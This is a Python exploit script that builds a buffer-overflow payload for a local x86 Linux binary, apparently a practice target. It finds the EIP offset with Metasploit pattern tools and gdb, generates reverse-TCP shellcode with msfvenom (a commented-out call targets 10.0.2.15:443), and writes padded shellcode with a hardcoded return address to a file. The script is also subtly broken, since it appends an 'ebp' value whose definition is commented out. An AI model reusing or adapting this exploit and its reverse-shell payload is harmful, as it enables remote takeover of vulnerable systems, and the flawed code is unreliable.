from subprocess import *
import re
import struct


def get_offset(name):
	p=run(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb', '-l','500'], stdout=PIPE)
	f=open('pattern_input.txt','wb')
	f.write(p.stdout)
	f.close()

	reg= re.compile('EIP[\S ]+',re.IGNORECASE)
	reg2 = re.compile('\'[a-z0-9]+\'',re.IGNORECASE)
	p=run(["gdb", "-batch", "-x", "./gdb_script", "--args", name], stdout=PIPE)
	t=p.stdout
	t=t.decode("utf-8")
	t=reg.findall(t)[1]

	t=reg2.findall(t)[0][1:-1]

	p=run(['/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb', '-q',t], stdout=PIPE)
	t= p.stdout.decode("utf-8")

	print('Offset is: ', t)

	offset = int(t.split(' ')[-1])
	return offset



def get_shellcode_linux(host,port):
	p = run(['msfvenom', '-a', 'x86', '--platform', 'linux', '-p', 'linux/x86/shell_reverse_tcp', 'LHOST='+host, 'LPORT='+port, '-b', '\'\\x00\'', '-f', 'python'], stdout=PIPE)
	t = p.stdout.decode("utf-8")
	t = t.split('buf =')[1]
	t = t.split('buf +=')[1:]
	t = "".join(t)
	t = t.split('\n')
	t = "".join(t)
	t = t.split('"')
	t = "".join(t)
	t = t.split(' ')
	t = "".join(t)
	print(t)
	t = t.encode("utf-8")
	return t.decode('unicode_escape')



#get_shellcode_linux('10.0.2.15','443')
offset = 416 # get_offset('vuln1_x86_vanilla')
"""
buf = b""
buf += b'\x90'*300
buf += b"\x66\x81\xEC\x98\x01"
buf +=  b"\xda\xce\xd9\x74\x24\xf4\xba\x29\xfe\xbc\xdd\x5b\x29\xc9\xb1\x12\x31\x53\x17\x03\x53\x17\x83\xea\xfa\x5e\x28\xdd\xd9\x68\x30\x4e\x9d\xc5\xdd\x72\xa8\x0b\x91\x14\x67\x4b\x41\x81\xc7\x73\xab\xb1\x61\xf5\xca\xd9\x7b\x05\x2f\x16\x14\x07\x2f\x29\x5f\x8e\xce\x99\xf9\xc1\x41\x8a\xb6\xe1\xe8\xcd\x74\x65\xb8\x65\xe9\x49\x4e\x1d\x9d\xba\x9f\xbf\x34\x4c\x3c\x6d\x94\xc7\x22\x21\x11\x15\x24"

print(len(buf))
"""

buf =  b""
buf += b"\xdd\xc1\xd9\x74\x24\xf4\x5b\xbe\x2f\x47\x69\x37\x2b"
buf += b"\xc9\xb1\x12\x31\x73\x17\x83\xeb\xfc\x03\x5c\x54\x8b"
buf += b"\xc2\x93\x81\xbc\xce\x80\x76\x10\x7b\x24\xf0\x77\xcb"
buf += b"\x4e\xcf\xf8\xbf\xd7\x7f\xc7\x72\x67\x36\x41\x74\x0f"
buf += b"\x09\x19\xbe\xaa\xe1\x58\xbf\x35\x49\xd5\x5e\x85\xcb"
buf += b"\xb6\xf1\xb6\xa0\x34\x7b\xd9\x0a\xba\x29\x71\xfb\x94"
buf += b"\xbe\xe9\x6b\xc4\x6f\x8b\x02\x93\x93\x19\x86\x2a\xb2"
buf += b"\x2d\x23\xe0\xb5"


eip_num = 0xffffd434
ebp_num = eip_num-0x1C

#ebp = struct.pack("<L", ebp_num)
eip = struct.pack("<L", eip_num)

print(offset-len(buf))
buf+= b"\x90"*(offset-len(buf))

print(len(buf))

buf+=ebp
buf+=eip

print(len(buf))

f=open('exploit_x86_vanilla_linux.txt','wb')

f.write(buf)
f.close()

#p=run(['./vuln1_x86_vanilla'], stdout=PIPE)

#sh.write(buf)

#sh.communicate()

#print()